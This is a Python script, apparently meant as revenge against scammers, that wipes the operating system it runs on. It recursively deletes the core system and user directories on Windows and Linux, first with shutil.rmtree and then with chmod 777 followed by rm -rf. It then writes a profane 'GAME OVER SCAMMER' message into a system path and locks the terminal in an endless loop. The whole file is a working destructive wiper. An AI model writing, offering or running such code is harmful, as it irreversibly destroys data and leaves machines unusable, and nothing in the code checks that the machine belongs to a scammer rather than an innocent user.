#!/usr/bin/env python3
import os
import platform
import shutil
import subprocess
import sys

def get_main_directories():
    """Get all main directories to delete"""
    system = platform.system().lower()
    
    if system == "windows":
        # Windows main directories
        return [
            "C:\\Users",
            "C:\\Program Files",
            "C:\\Windows",
            "C:\\ProgramData",
            "C:\\Users\\Public",
            "C:\\Program Files (x86)"
        ]
    else:
        # Unix/Linux main directories
        return [
            "/root",
            "/home",
            "/etc",
            "/bin",
            "/sbin",
            "/usr",
            "/lib",
            "/boot",
            "/var",
            "/opt"
        ]

def delete_directories(directories):
    """Delete directories with multiple methods"""
    for dir_path in directories:
        try:
            if os.path.exists(dir_path):
                # Method 1: Direct deletion
                try:
                    shutil.rmtree(dir_path, ignore_errors=True)
                except:
                    pass
                
                # Method 2: Force deletion with permissions
                try:
                    subprocess.run(["chmod", "-R", "777", dir_path])
                    subprocess.run(["rm", "-rf", dir_path])
                except:
                    pass
                
                print(f"Deleted: {dir_path}")
        except Exception as e:
            print(f"Failed to delete {dir_path}: {e}")

def create_message():
    """Create the permanent message"""
    message = """
    ┌─────────────────────────────────────────────────┐
    │          GAME OVER SCAMMER                      │
    ├─────────────────────────────────────────────────┤
    │  F**k off scammer now you're going to jail.    │
    │  Wait and see...                                │
    ├─────────────────────────────────────────────────┤
    │  SYSTEM LOCKED - FACTORY RESET REQUIRED         │
    └─────────────────────────────────────────────────┘
    """
    
    # Write to system locations
    if platform.system().lower() == "windows":
        msg_path = "C:\\Windows\\System32\\gameover.msg"
    else:
        msg_path = "/etc/gameover.msg"
    
    with open(msg_path, "w") as f:
        f.write(message)
    
    return msg_path

def lock_terminal():
    """Complete terminal lock"""
    # Clear screen
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")
    
    # Show message
    try:
        with open(create_message(), "r") as f:
            print(f.read())
    except:
        print("SYSTEM LOCKED")
        print("No recovery possible")
    
    # Prevent input
    try:
        import termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        new_settings = old_settings[:]
        new_settings[3] &= ~(termios.ICANON | termios.ECHO)
        termios.tcsetattr(fd, termios.TCSADRAIN, new_settings)
    except:
        pass
    
    # Infinite lock
    while True:
        try:
            input()
        except:
            pass

def main():
    print("Deleting main directories...")
    dirs = get_main_directories()
    delete_directories(dirs)
    lock_terminal()

if __name__ == "__main__":
    main()
